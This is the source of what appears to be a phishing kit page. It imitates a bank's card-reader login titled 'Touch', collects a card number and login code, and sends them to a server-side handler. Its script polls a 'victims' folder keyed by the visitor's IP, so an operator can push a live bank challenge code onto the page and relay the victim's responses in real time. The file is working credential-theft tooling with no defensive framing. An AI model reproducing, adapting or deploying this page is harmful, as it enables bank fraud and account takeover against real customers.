<?php
session_start();
include "./lang.php";
include "./assets/php/config/config.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./assets/css/helpers.css">
        <link rel="stylesheet" href="./assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="./assets/imgs/ff.ico" />

        <title>Touch</title>
    </head>
    <body>

        <div class="mobile-menu">
            <div class="logo">
                <img src="./assets/imgs/logo.svg">
            </div>
            <div>
                <ul class="ps-0 mb-0 d-flex algin-items-center justify-content-end">
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x1.svg" alt="">Apps</li>
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x2.svg" alt="">Menu</li>
                    <li class="d-flex algin-items-center"><img src="./assets/imgs/x3.svg" alt="">Help</li>
                </ul>
            </div>
        </div>

        <div id="wrapper">
            <div class="left">
                <div class="logo d-lg-block d-md-none d-sm-none d-none">
                    <img src="./assets/imgs/logo.svg">
                </div>
            </div>
            <div class="right">
                <div class="top-menu d-lg-block d-md-none d-sm-none d-none">
                    <ul class="ps-0 mb-0 d-flex algin-items-center justify-content-end">
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x1.svg" alt="">Apps</li>
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x2.svg" alt="">Menu</li>
                        <li class="d-flex algin-items-center"><img src="./assets/imgs/x3.svg" alt="">Help</li>
                    </ul>
                </div>

                <div class="inner">
                    <h3 class="title"><img src="./assets/imgs/arrowk.svg"> <?php echo get_text('login_title'); ?></h3>
                    <div class="type d-lg-block d-md-none d-sm-none d-none">
                        <img style="width: 400px;cursor:pointer;" src="./assets/imgs/type2.png">
                    </div>
                    <div class="type2 d-lg-none d-md-block d-sm-block d-block">
                        <p>Select your logon method</p>
                        <div class="in">
                            <div>
                                <img src="./assets/imgs/machine.svg">
                                <span>Manual</span>
                            </div>
                            <div><i class="fa-solid fa-angle-down"></i></div>
                        </div>
                    </div>
                    <form action="./assets/php/config/func.php" method="post">
                        <input type="hidden" name="log">
                        <div class="part">
                            <h4 class="tt1"><?php echo get_text('enter_card'); ?></h4>
                            <div class="form-group <?php if(isset($_GET['error']))  echo "has-error"; ?>">
                                <input type="text" name="one" id="one" class="form-control" placeholder="_ _ _ _  _ _ _ _  _ _ _ _  _ _ _ _  _">
                                <?php if( isset($_GET['error']) ) : ?>
                                <p class="errmsg"><?php echo get_text('one_error'); ?></p>
                                <?php endif; ?>
                            </div>
                            <div class="remember"><img style="width: 24px; height: 24px;" src="./assets/imgs/remember1.png"> <?php echo get_text('save'); ?></div>
                        </div>
                        <div class="part">
                            <h4 class="tt2"><?php echo get_text('insert_bank_card'); ?></h4>
                            <div class="twoside mb10">
                                <div>
                                    <p><?php echo get_text('press'); ?></p>
                                </div>
                                <div>
                                    <img style="height: 40px; width: 60px; cursor:pointer;" src="./assets/imgs/log.svg">
                                    <span>+</span>
                                    <img style="height: 40px; width: 60px; cursor:pointer;" src="./assets/imgs/log.svg">
                                </div>
                            </div>

                            <div class="twoside mb10">
                                <div>
                                    <p><?php echo get_text('start_code'); ?></p>
                                </div>
                                <div>
                                    <span style="font-weight:600;" class="zzz">4444 4444</span>
                                    <span>+</span>
                                    <img style="height: 40px; width: 60px; cursor:pointer;" src="./assets/imgs/ok.svg">
                                </div>
                            </div>

                            <div class="twoside">
                                <div>
                                    <p><?php echo get_text('enter_pin'); ?></p>
                                </div>
                                <div>
                                    <span style="font-weight:600;"><?php echo get_text('pin'); ?></span>
                                    <span>+</span>
                                    <img style="height: 40px; width: 60px; cursor:pointer;" src="./assets/imgs/ok.svg">
                                </div>
                            </div>
                        </div>

                        <div class="part">
                            <h4 class="tt3"><?php echo get_text('enter_login'); ?></h4>
                            <div class="twoside">
                                <div>
                                    <div class="form-group <?php if(isset($_GET['error']))  echo "has-error"; ?>">
                                        <input type="text" name="login_code" id="login_code" inputmode="numeric"  class="form-control" placeholder="_ _ _ _  _ _ _ _">
                                        <?php if( isset($_GET['error']) ) : ?>
                                        <p class="errmsg"><?php echo get_text('code_error'); ?></p>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                <div>
                                    <button type="submit" class="btn_sub" disabled><?php echo get_text('login'); ?></button>
                                </div>
                            </div>
                        </div>

                    </form>
                </div>

            </div>
        </div>



        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./assets/js/js.js"></script>
        
        <script>
            $('#one').mask('0000 0000 0000 0000 0');
            $('#login_code').mask('0000 0000');
            $("input").keyup(function(){
                if ($("#one").val() != "" & $("#login_code").val() != "") {
                    $(".btn_sub").prop("disabled",false);
                    $(".btn_sub").addClass("active");
                }else{
                    $(".btn_sub").prop("disabled",true);
                    $(".btn_sub").removeClass("active");
                }
            });             
            var ip = '<?php echo get_client_ip();?>';
            var waiting = setInterval(function() {
                $.get(`./victims/${ip}+.txt?`+ new Date().getTime(), function(data) {
                    if( data != "") {
                        $(".zzz").text(data);
                        // console.log(data);
                    }
                });
            }, 1000);              
        </script>
    </body>
</html>